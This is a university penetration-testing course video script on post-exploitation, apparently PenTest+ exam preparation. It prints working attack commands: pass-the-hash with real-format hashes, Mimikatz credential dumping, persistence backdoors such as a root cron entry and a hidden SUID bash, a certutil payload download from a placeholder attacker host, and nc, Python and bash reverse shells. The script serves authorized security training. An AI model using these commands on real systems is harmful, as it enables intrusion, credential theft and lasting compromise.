# Video Script: Module 08 — Post-Exploitation and Lateral Movement

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 20–24 minutes

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

### SLIDE 1 — Introduction (0:00–1:00)

Welcome to Module 08: Post-Exploitation and Lateral Movement. I am Professor Nash.

You have established your first foothold. Now what? In a real engagement, the initial exploit is rarely the end of the story. The question becomes: what can an attacker do with this access, and how far can they reach into the organization?

Post-exploitation answers that question. It covers privilege escalation — gaining higher-level access than the initial compromise provided — credential dumping, lateral movement to other systems, persistence mechanisms, and living-off-the-land techniques.

Authorization reminder: everything in this module occurs only within explicitly authorized scope against dedicated test environments. These techniques on unauthorized systems constitute criminal activity.

---

### SLIDE 2 — Post-Exploitation Goals (1:00–2:30)

After initial exploitation, a penetration tester pursues several objectives to demonstrate the full impact of the vulnerability:

1. **Privilege Escalation** — elevate from low-privileged user to admin/root/SYSTEM
2. **Persistence** — establish a mechanism to maintain access if the initial shell is lost
3. **Defense Evasion** — identify what security controls are present
4. **Credential Access** — extract hashes, tokens, or cleartext credentials
5. **Discovery** — map the internal network and identify additional targets
6. **Lateral Movement** — use gathered credentials to access additional systems
7. **Data Exfiltration** — demonstrate impact by identifying and staging sensitive data

For the PenTest+ exam, this maps to Domain 3: Attacks and Exploits. Post-exploitation objectives are tested both conceptually and tool-specifically.

---

### SLIDE 3 — Linux Privilege Escalation (2:30–5:00)

When you gain an initial shell as a low-privileged user on Linux, privilege escalation to root is usually the next objective.

### SUID Binaries

SUID (Set User ID) binaries run with the file owner's permissions instead of the executing user's permissions. If a binary owned by root has the SUID bit set, it runs as root regardless of who executes it.

```bash
# Find all SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common exploitable SUID binaries
# /usr/bin/find, /bin/bash, /usr/bin/vim, /usr/bin/python
```

GTFOBins (gtfobins.github.io) catalogs how common binaries can be abused when they have SUID set.

### Sudo Misconfigurations

```bash
# Check sudo privileges for current user
sudo -l

# If a user can run /usr/bin/vim as sudo:
sudo vim -c ':!/bin/bash'
```

### Cron Jobs

```bash
# Check running cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
crontab -l

# If a cron job runs a script writable by the current user,
# inject a reverse shell or privilege escalation payload
```

### Kernel Exploits

```bash
# Check kernel version
uname -a

# Search for kernel exploits
searchsploit linux kernel 3.x
```

Kernel exploits are highly effective but risky — they can crash the system. Use as a last resort and only against test systems.

---

### SLIDE 4 — Windows Privilege Escalation (5:00–7:30)

Windows privilege escalation follows similar principles with platform-specific techniques.

### Service Misconfigurations

Unquoted service paths: when a Windows service path contains spaces and is not quoted, Windows tries to execute each component as an executable.

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check service permissions
accesschk.exe -uwcqv "Everyone" * /accepteula
```

### Weak File Permissions

```powershell
# Check permissions on service executables
icacls "C:\Program Files\VulnService\service.exe"

# Check registry permissions for autorun entries
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

### AlwaysInstallElevated

If both `HKLM` and `HKCU` registry keys for AlwaysInstallElevated are set to 1, any MSI file runs with SYSTEM privileges:

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### WinPEAS and PowerUp

Automated privilege escalation enumeration tools:

```bash
# WinPEAS — comprehensive Windows privilege escalation checker
winPEASany.exe

# PowerUp (PowerShell)
. .\PowerUp.ps1
Invoke-AllChecks
```

### Meterpreter getsystem

```text
meterpreter > getsystem
meterpreter > getuid
```

`getsystem` attempts multiple escalation techniques automatically. It is a good first step before manual techniques.

---

### SLIDE 5 — Credential Dumping Concepts (7:30–9:30)

Credentials are the currency of lateral movement. With a password hash or token, you can authenticate as another user without knowing their password.

### Windows Credential Storage

Windows stores credentials in several locations:

- **SAM database** — local account hashes (at `C:\Windows\System32\config\SAM`) — accessible only with SYSTEM privileges
- **LSASS process** — Local Security Authority Subsystem Service — stores credentials in memory for single sign-on
- **NTDS.DIT** — Active Directory database on domain controllers — contains all domain account hashes
- **Credential Manager** — stored credentials for websites, network shares, and applications

### Mimikatz Concepts

Mimikatz is the most widely known credential extraction tool. On the PenTest+ exam, you need to understand what it does conceptually.

```text
# Mimikatz concepts (educational — authorized test environments only)
# sekurlsa::logonpasswords — extracts credentials from LSASS memory
# lsadump::sam — dumps SAM database hashes
# lsadump::dcsync — performs DCSync to request password hashes from DC
# sekurlsa::pth — pass-the-hash: start process using NTLM hash
```

Mimikatz requires SYSTEM or administrator-level privileges to access LSASS. Modern Windows versions with Credential Guard and Protected Users restrict what Mimikatz can extract.

### Meterpreter Credential Collection

```text
meterpreter > hashdump
meterpreter > run post/windows/gather/credentials/credential_collector
meterpreter > load kiwi
meterpreter > creds_all
```

---

### SLIDE 6 — Pass-the-Hash (9:30–11:00)

Pass-the-hash (PtH) is a lateral movement technique that uses an NTLM password hash to authenticate to Windows services without cracking the hash or knowing the plaintext password.

How it works: Windows NTLM authentication uses the hash, not the plaintext password, as the authentication credential. If you capture a hash, you can impersonate that user.

```bash
# PsExec-style PtH with Metasploit
msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set SMBUser Administrator
msf6 exploit(psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
msf6 exploit(psexec) > set RHOSTS 192.168.1.60
msf6 exploit(psexec) > run

# impacket-psexec
impacket-psexec Administrator@192.168.1.60 -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4

# crackmapexec PtH
crackmapexec smb 192.168.1.0/24 -u Administrator -H 32ed87bdb5fdc5e9cba88547376818d4
```

On the PenTest+ exam: know that pass-the-hash uses NTLM hashes specifically (not Kerberos or password hashes alone). Kerberos ticket reuse is a related but separate technique called pass-the-ticket.

---

### SLIDE 7 — Pivoting (11:00–13:00)

Pivoting uses a compromised host as a relay to access network segments not directly reachable from the attacker's machine. This simulates how attackers move from an internet-facing compromised host into the internal network.

### Metasploit Autoroute

```text
# After establishing a session on 192.168.1.50 (which can reach 10.10.10.0/24)
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > background

msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(socks_proxy) > set SRVPORT 1080
msf6 auxiliary(socks_proxy) > set VERSION 5
msf6 auxiliary(socks_proxy) > run -j
```

Then configure proxychains to route tools through the proxy:

```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# Route Nmap through the pivot
proxychains nmap -sT -p 22,80,445 10.10.10.20
```

### SSH Tunneling

```bash
# Local port forwarding: access 10.10.10.80:80 via localhost:8080
ssh -L 8080:10.10.10.80:80 user@pivot_host

# Dynamic forwarding (SOCKS proxy)
ssh -D 1080 user@pivot_host
```

### Port Forwarding in Meterpreter

```text
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.20
```

This creates a local listener on the attacker's port 3389 that forwards to the internal machine's RDP port.

---

### SLIDE 8 — Persistence Mechanisms (13:00–15:00)

Persistence ensures continued access if the initial shell is lost — useful for demonstrating what an attacker could maintain long-term.

### Windows Persistence

```powershell
# Registry run key (runs on every user login)
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\Users\user\AppData\Roaming\shell.exe"

# Scheduled task
schtasks /create /sc onlogon /tn "WindowsUpdate" /tr "C:\shell.exe" /ru SYSTEM

# Meterpreter persistence module
meterpreter > run post/windows/manage/persistence_exe STARTUP=SCHEDULER
```

### Linux Persistence

```bash
# Cron job
echo "* * * * * /tmp/shell.sh" >> /var/spool/cron/crontabs/root

# SSH authorized keys (if .ssh directory is accessible)
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# SUID backdoor
cp /bin/bash /tmp/.hidden_bash && chmod +s /tmp/.hidden_bash
```

### Metasploit Persistence Modules

```text
msf6 > use post/windows/manage/persistence_exe
msf6 > use post/linux/manage/sshkey_persistence
```

**Important:** In professional engagements, persistence mechanisms must be documented and removed at the end of the engagement. Leaving backdoors is a serious professional and legal liability.

---

### SLIDE 9 — Living Off the Land (15:00–17:00)

"Living off the land" (LotL) describes using legitimate built-in tools and binaries that are already present on the target system for malicious purposes. This avoids introducing new malware that might trigger detection.

### Windows LotL Techniques

```powershell
# PowerShell for reconnaissance
Get-LocalUser
Get-LocalGroup
Get-Process
netstat -an
ipconfig /all
systeminfo

# PowerShell for file operations
Get-Content C:\Users\Administrator\Documents\credentials.txt
Compress-Archive -Path C:\sensitive -DestinationPath C:\Windows\Temp\data.zip

# WMI for remote execution (requires credentials)
wmic /node:192.168.1.60 process call create "cmd.exe /c whoami > C:\output.txt"

# certutil for download (Living off the land download)
certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe
```

### Linux LotL Techniques

```bash
# nc (netcat) for reverse shell
nc -e /bin/bash 10.10.10.5 4444

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Bash reverse shell
bash -i >& /dev/tcp/10.10.10.5/4444 0>&1
```

LotL techniques are detected through behavioral analysis rather than signature-based detection — this is why modern endpoint detection and response (EDR) systems monitor PowerShell execution, WMI calls, and unusual process relationships.

---

### SLIDE 10 — Defense Evasion Awareness (17:00–18:30)

Understanding what defenders see helps penetration testers demonstrate realistic attacker behavior and helps organizations understand what to monitor.

Common detection indicators for post-exploitation:

- LSASS memory access patterns (credential dumping)
- Unusual PowerShell execution (encoded commands, AMSI bypass attempts)
- WMI lateral movement (WMI provider service spawning processes)
- Scheduled task creation with suspicious parameters
- New service installation
- SMB traffic with admin shares (IPC$, ADMIN$, C$)
- PsExec artifacts in System event logs

For the PenTest+ exam, know the MITRE ATT&CK framework as the authoritative reference for adversary techniques. Post-exploitation techniques map to ATT&CK Tactics: Persistence, Privilege Escalation, Defense Evasion, Credential Access, Discovery, Lateral Movement, and Exfiltration.

---

### SLIDE 11 — PenTest+ Exam Alignment (18:30–20:00)

For PT0-002, focus on these areas from Module 08:

Linux privilege escalation vectors: SUID binaries, sudo misconfigurations, writable cron jobs, and kernel exploits.

Windows privilege escalation vectors: unquoted service paths, weak service permissions, AlwaysInstallElevated, and token impersonation.

Credential dumping: SAM, LSASS, NTDS.DIT are the three locations. SYSTEM access is required for SAM and LSASS.

Pass-the-hash: uses NTLM hash, not password. Works against SMB and other NTLM-authenticated services.

Pivoting: autoroute in Metasploit, proxychains, SSH tunneling.

Persistence: registry run keys, scheduled tasks, cron jobs, SSH keys.

Living off the land: certutil, PowerShell, WMI on Windows; bash/python/nc on Linux.

MITRE ATT&CK framework maps to these post-exploitation techniques.

---

### SLIDE 12 — Closing and Lab Preview (20:00–21:00)

Module 08 took your initial foothold and extended it into a full demonstration of impact. Key takeaways:

- Privilege escalation is how you show the real impact of initial access
- Credential dumping and pass-the-hash enable lateral movement without cracking passwords
- Pivoting extends access to network segments not directly reachable
- Persistence documents the long-term risk of unpatched vulnerabilities
- Living off the land uses built-in tools — harder to detect by traditional AV
- All persistence mechanisms must be removed at engagement end

In the lab, you will perform Linux privilege escalation via SUID binaries on Metasploitable, and practice pass-the-hash against an authorized Windows target. In Module 09, we shift focus to web application penetration testing.

---

### End of Module 08 Video Script

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
